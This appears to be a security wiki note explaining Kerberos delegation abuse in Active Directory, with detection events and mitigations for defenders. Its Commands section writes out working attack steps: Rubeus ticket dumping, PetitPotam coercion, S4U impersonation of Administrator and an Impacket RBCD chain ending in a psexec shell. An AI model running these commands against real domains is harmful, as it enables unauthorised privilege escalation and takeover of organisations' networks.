---
title: Kerberos Delegation Abuse
type: source
created: 2026-06-12
updated: 2026-06-13
tags: [kerberos, active-directory, privilege-escalation]
source: raw/kerberos_delegation_abuse.md
---

# Kerberos Delegation Abuse

> Source: `raw/kerberos_delegation_abuse.md` (Gemini research summary)

## Summary

Kerberos delegation lets a service impersonate a user to a backend service.
Three forms, increasingly scoped, each with their own abuse path:

### Unconstrained Delegation
A `TRUSTED_FOR_DELEGATION` host receives and caches a copy of every
authenticating user's TGT. Admin on that host = dump all cached TGTs
(Mimikatz/Rubeus). Attackers also use **coercion** (Printer Bug,
PetitPotam) to force a DC to authenticate to the host, capturing the DC's
machine-account TGT — a direct path to [[dcsync]].

### Constrained Delegation (KCD)
`msDS-AllowedToDelegateTo` restricts impersonation to specific SPNs via
S4U2Self/S4U2Proxy. Compromising the service account's secret lets an
attacker impersonate (almost) any user to those backend services.

### Resource-Based Constrained Delegation (RBCD)
The *target* object specifies who can delegate to it
(`msDS-AllowedToActOnBehalfOfOtherIdentity`). Doesn't need Domain Admin —
just `GenericWrite`/`WriteProperty` on the target computer object, plus the
ability to create a computer account (default Machine Account Quota = 10).
Attacker creates a computer account, adds it to the target's RBCD
attribute, then S4U2Self/S4U2Proxy as a Domain Admin to that target.

**No-creds variant**: [[rbcd-via-ntlm-relay]] reaches this same primitive
without any starting credentials, by relaying a coerced computer account's
NTLM auth to LDAPS (mitm6 + WPAD spoofing).

## Commands

```powershell
# --- Unconstrained delegation ---
# Find hosts/accounts trusted for unconstrained delegation
Get-DomainComputer -Unconstrained -Properties dnshostname

# On a compromised unconstrained host: dump cached TGTs
Rubeus.exe triage                 # list cached tickets
Rubeus.exe dump /service:krbtgt /nowrap

# Coerce a DC to auth to your unconstrained host (captures DC$ TGT -> DCSync)
PetitPotam.py <attacker-ip> <dc-ip>
```

```powershell
# --- Constrained delegation (KCD) / S4U ---
# Find accounts with protocol transition (TrustedToAuth)
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto

# Rubeus S4U2Self + S4U2Proxy — impersonate Administrator to an allowed SPN
Rubeus.exe s4u /user:svc_web /rc4:<svc_web_nthash> /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt
```

```bash
# --- RBCD (Resource-Based Constrained Delegation) ---
# 1. Create a computer account (needs MachineAccountQuota > 0)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' DOMAIN/user:password

# 2. Grant that account RBCD rights on the target computer object
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write DOMAIN/user:password

# 3. S4U2Self/S4U2Proxy as the new computer account, impersonating a Domain Admin
getST.py -spn cifs/target.corp.local -impersonate Administrator -dc-ip <dc-ip> 'DOMAIN/EVIL$:Passw0rd!'

# 4. Use the resulting ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

## Key points

- **Tools**: Mimikatz, Rubeus, Impacket, PowerView, BloodHound.
- **Detection**: PowerView enumeration of unconstrained/`TrustedToAuth`
  accounts; Event 4624 Type 3 on unconstrained hosts; Event 4769 where
  client≠service account for KCD; Event 5136 changes to
  `msDS-AllowedToActOnBehalfOfOtherIdentity`; Event 4741 (computer created)
  followed by S4U2Proxy.
- **Mitigations**: eliminate unconstrained delegation; "account is
  sensitive, cannot be delegated" flag for Tier-0; Protected Users;
  least-privilege `msDS-AllowedToDelegateTo`; [[gmsa]]; **Machine Account
  Quota = 0** (closes default RBCD path); strict ACL auditing /
  [[ad-tiering-and-hardening|AD tiering]].

## Links

- [[dcsync]] — common end-goal of unconstrained delegation coercion attacks
- [[krbtgt]] — TGT is the object being harvested in unconstrained delegation
- [[kerberos-authentication]] — S4U2Self/S4U2Proxy extend the base flow
- [[gmsa]], [[ad-tiering-and-hardening]] — mitigations
- [[rbcd-via-ntlm-relay]] — credential-less RBCD via mitm6/WPAD relay
- [[acl-abuse]] — RBCD attribute write is a GenericWrite/GenericAll pattern
- [[shadow-credentials]] — same write-an-attribute-to-become-the-account shape, applied to msDS-KeyCredentialLink instead of msDS-AllowedToActOnBehalfOfOtherIdentity
